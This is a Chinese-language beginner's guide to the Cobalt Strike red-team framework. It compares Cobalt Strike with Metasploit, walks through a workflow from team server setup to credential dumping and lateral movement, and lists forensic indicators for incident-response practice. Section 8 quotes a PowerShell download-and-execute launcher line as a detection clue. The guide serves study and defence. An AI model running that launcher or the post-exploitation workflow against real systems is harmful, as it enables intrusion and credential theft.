# Cobalt Strike 入门手册

> 面向：用过 MSF、没用过 CS 的人
> 配套：`MSF知识整理.md`、`32-64位会话专题.md`、`PTH*` 系列
> **先读第 0 章再往下**

---

## 0. 先明确三件事（不然会走弯路）

1. **CS 是商业软件**，需要授权。网上流传的破解版**有被投毒/带后门的实例**，用在备赛机器上可能被反打；部分国内比赛也**明确规定禁用**。学习请走官方文档 + 官方培训材料 + 授权环境。
2. **CS 不擅长"打进去"** —— 它没有漏洞利用库。真实红队流程是：**MSF / 自研 exp 拿初始 shell → 派生到 CS 做后渗透**。两者**互补，不是替代**。
3. **CS 的"简单"只在操作层面** —— 部署、授权、免杀、断网适配都比 MSF 麻烦。**"装上就能用"是错觉**，默认配置在 360 / 火绒 / EDR 面前基本裸奔。

> **如果只是备赛（解题赛/靶场），MSF 是更务实的主力** —— 免费、exp 多、单机够用。
> 这份手册的价值在于：**看懂它、知道它和 MSF 的对应关系**，以及**应急溯源时能认出它的痕迹**（第 8 章）。

---

## 1. 架构（和 MSF 根本不同）

MSF 是**单机一体**：`msfconsole` + `meterpreter` 跑在一台机器上。

CS 是**客户端/服务端架构**，天生为团队设计：

```
┌─────────────────────────┐
│  Team Server（服务端）    │  ← 一台 Linux，所有会话/凭据/日志都在这
│  默认端口 50050          │
└───────────┬─────────────┘
            │  （多个客户端可同时连）
    ┌───────┴───────┐
    │               │
┌───▼────┐     ┌────▼───┐
│ Client │     │ Client │   ← Java 图形界面，你操作的地方
│ (你)   │     │ (队友) │
└────────┘     └────────┘
            ▲
            │ Beacon 回连
    ┌───────┴────────┐
    │ Beacon（植入体）│   ← 目标机器上的后门
    └────────────────┘
```

| 角色 | 是什么 | 跑在哪 |
|---|---|---|
| **Team Server** | 服务端，数据中枢 | Linux（攻击机/VPS） |
| **Client** | 图形界面 | 你自己的机器（Java） |
| **Beacon** | 植入体 | 目标机器 |

**关键理解**：Team Server 是核心。**一个团队一个 Team Server，所有人连它** —— 这是 CS 团队赛优势的来源，也是断网环境下比 MSF 麻烦的原因（要起服务 + Java 环境）。

---

## 2. 术语表（新手最需要的一张表）

| 术语 | 含义 |
|---|---|
| **Listener** | 监听器。定义 Beacon 怎么回连。类型：HTTP / HTTPS / SMB / TCP / Foreign |
| **Beacon** | 植入体。分 **staged**（分阶段加载）和 **stageless**（一体） |
| **Payload / Artifact** | 生成的载荷（EXE / DLL / PowerShell / raw 等） |
| **Malleable C2 Profile** | 定义 Beacon **通信流量特征**的配置文件（伪装成正常流量） |
| **Sleep / Jitter** | 心跳间隔 / 抖动。**越长越隐蔽，响应越慢** |
| **Pivot** | 会话中转 —— 通过一个 Beacon 访问它背后的内网 |
| **SMB Beacon / TCP Beacon** | 走命名管道/TCP 的 Beacon，用于**不出网的内网机器** |
| **Foreign Listener** | 接收**其他框架**（如 MSF）的会话，把 MSF 的 shell 接进 CS |
| **Aggressor Script** | CS 的脚本语言，写插件/自动化 |
| **Artifact Kit / Sleep Mask Kit / UDRL Kit** | 各种定制套件，**需要自己编译**，用于调整载荷特征 |
| **View** | 客户端顶部那些标签页（会话表、凭据表、目标表…） |
| **Beacon Console** | 交互窗口，**Beacon 有自己的命令集**（见第 5 章） |

---

## 3. 图形界面导览

CS Client 顶部三个菜单：

| 菜单 | 里面有什么 |
|---|---|
| **Cobalt Strike** | 连接管理、偏好设置 |
| **View** | Applications / **Credentials** / Downloads / Event Log / Keystrokes / Proxy Pivots / Screenshots / Script Console / **Targets** / **Sessions** |
| **Attack** | **Packages**（生成载荷）/ Web Drive-by / Scripted Web Delivery / Spear Phish |
| **Reporting** | 导出报告 |

**底部四个表格**（新手先认这四个）：
- **Sessions** —— 上线的主机（最重要）
- **Targets** —— 扫到/碰到的目标
- **Credentials** —— **自动收集的凭据**（很实用）
- **Event Log** —— 操作日志

---

## 4. 标准工作流（从零到横向）

```
① 起 Team Server   →  ./teamserver <你的IP> <密码> [profile]
② Client 连接      →  填 host / port(50050) / 密码
③ 建 Listener      →  Cobalt Strike → Listeners → Add（一般选 HTTPS）
④ 生成载荷         →  Attack → Packages → Windows Executable
                       （或 Scripted Web Delivery，一行命令上线）
⑤ 目标执行 → Sessions 表里出现 Beacon
⑥ 右键 Beacon 交互：
      Interact          打开交互窗口
      Explore           → 文件 / 进程 / 网络
      Access            → 提权（Elevate）、凭据（Dump Hashes / Kerberos）
      Pivot             → 建 SMB Beacon / 端口转发 / SOCKS
      Session           → sleep、jitter、退出
⑦ 用凭据横向        →  Jump → psexec / wmi / winrm
⑧ 通过 Pivot 再打内网
```

> **记住这个心智模型**：CS 的绝大多数操作是**右键会话**出来的菜单，不是敲命令。这是"图形界面更简单"的来源。

---

## 5. MSF ↔ CS 操作对照（对你最有用的一章）

| 目的 | **MSF** | **CS** |
|---|---|---|
| 起服务 | `msfconsole` | `./teamserver` + Client |
| 建监听 | `use exploit/multi/handler` | Listeners → Add |
| 生成载荷 | `msfvenom` | Attack → Packages |
| 看上线主机 | `sessions` | **Sessions 表** |
| 进入交互 | `sessions -i <id>` | 右键 → Interact |
| 提权 | `getsystem` | 右键 → **Elevate** |
| 抓 hash | `hashdump` / `load kiwi` | 右键 → **Access → Dump Hashes** |
| 迁移进程 | `migrate <pid>` | Explore → Process List → Inject |
| SOCKS 代理 | `auxiliary/server/socks_proxy` | 右键 → **Pivot → SOCKS** |
| 端口转发 | `portfwd add` | 右键 → **Pivot → 端口转发** |
| 截图 / 键盘 | `screenshot` / `keyscan` | Explore → Screenshot / Keystrokes |
| 横向 | `exploit/windows/smb/psexec` | 右键 → **Jump → psexec** |
| 扫内网 | `auxiliary/scanner/...` | 右键 → **Explore → Net View / Port Scan** |

**Beacon Console 里也有命令**（不想点菜单时用）：
```text
help  sleep  jitter  shell  powershell  upload  download  ls  cd  pwd
ps  kill  inject  migrate  getuid  getsystem  steal_token  rev2self
hashdump  logonpasswords  net  portscan  jobs  jobkill  spawn
psexec  psexec_psh  wmi  winrm  socks  rportfwd  checkin  exit
```

---

## 6. 隐蔽性（概念层面）

CS 相比 MSF 的核心优势在**流量和行为可定制**：

| 手段 | 作用 |
|---|---|
| **Sleep / Jitter** | 心跳间隔 + 随机抖动。越长越隐蔽，但操作响应越慢 |
| **Malleable C2 Profile** | 自定义 Beacon 的 HTTP 请求/响应特征，伪装成正常业务流量 |
| **各种 Kit**（Artifact / Sleep Mask / UDRL / Process Inject） | 调整载荷落盘、内存、注入行为，**需要自己编译** |
| **`spawnto`** | 指定注入/派生时使用哪个宿主进程 |

**必须清楚的现实**：
- **默认配置基本过不了主流杀软/EDR**。要用得起来，免杀调优的工作量远比学 CS 本身大。
- 这部分属于「红队工程」，**不是看文档就能会的**。有正规培训的授权课程会系统讲。
- **在 CTF/靶场里通常不需要考虑这些**（比赛环境一般不装 EDR）。

---

## 7. 新手常见坑

| # | 坑 | 说明 |
|---|---|---|
| 1 | Team Server 和 Client 搞混 | 概念上是两台角色；同机跑也行，但要分清 |
| 2 | **时间不同步导致 Beacon 不回连** | 目标与 Team Server 时间差太大会连不上 —— 排障先查时间 |
| 3 | `sleep` 设长了以为掉线 | Beacon 在睡觉，不是死了。`sleep 0` 可临时唤醒 |
| 4 | **32/64 位问题** | Beacon 也分 x86/x64；`inject` / `spawnto` 的位数要匹配。**参见你的 `32-64位会话专题.md`** |
| 5 | 团队多人操作同一个 Beacon | 会互相干扰，需要分工约定 |
| 6 | Credentials 表里有凭据但没用上 | 它**自动收集**，但要你手动去 Jump 里用 |
| 7 | 生成载荷后找不到文件 | 注意 Downloads 视图里找 |
| 8 | 断了网的比赛环境 | Team Server + Java Client 的部署成本比 MSF 高，要提前演练 |

---

## 8. 反向视角：应急溯源里怎么认 CS（衔接你的重点方向）

CS 的痕迹**特征性很强**，做应急题时是重要线索：

| 痕迹 | 特征 |
|---|---|
| **命名管道** | 默认 `msagent_*`、`MSSE-*` 等 —— **内存/流量分析的关键 IOC** |
| **默认 UA** | Beacon 默认 profile 的 User-Agent 很特征化（形如 `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)`） |
| **周期性外联** | **固定 sleep 间隔**的心跳式 HTTP(S) 外联（流量分析很好抓） |
| **Team Server 端口** | 默认 **50050** |
| **PowerShell 上线命令** | 形如 `powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://...'))"` —— 经典 stageless launcher，**一眼可辨** |
| **落地位置** | `%TEMP%` 下的随机名可执行文件 |
| **持久化** | 注册表 Run 键、计划任务、服务 |
| **进程注入** | 常见注入到 `rundll32.exe` / `svchost.exe` 等 |

**应急题里怎么用**：看到上面任一特征 → 反推「这是 CS Beacon」→ 接着找 **C2 地址 / Team Server IP / 落地文件名 / 持久化方式** —— 正好命中你那 15 条高频问题清单。

> 排障顺带：`Shift` 相关？不 —— **排 CS 不上线的问题，先查时间同步**（第 7 章第 2 条）。

---

## 9. 学习路径建议

```
1. 先把本手册第 1、2 章（架构 + 术语）看明白 —— 这是和 MSF 最大的差异
2. 第 5 章对照表对着你已有的 MSF 知识过一遍 —— 你已经会的部分直接映射
3. 官方文档 + 官方培训材料（唯一正当的深度来源）
4. 本地实验：Linux 起 Team Server + 两台 Windows 靶机（其中一台做内网跳板）
5. 走一遍完整链路：上线 → 提权 → 抓凭据 → Pivot → 打内网第二台
6. 第 8 章反向做一遍：用 Wireshark 抓自己的流量，找出 Beacon 特征
```

> 第 6 步很关键 —— **你会搭，才会拆**。应急溯源方向的价值就在这里。

---

## 10. 一句话总结

| 问题 | 答案 |
|---|---|
| CS 比 MSF 简单吗？ | **操作简单，整体不简单**。复杂度转移到部署 + 授权 + 免杀 |
| 备赛该学哪个？ | **解题赛/靶场：MSF 主力**；团队攻防：CS 有协作优势 |
| 应急溯源用得上吗？ | **用不上 CS，但必须认得出它的痕迹**（第 8 章） |
| 免费替代？ | Viper（国内开源）/ Sliver / Havoc / Mythic |
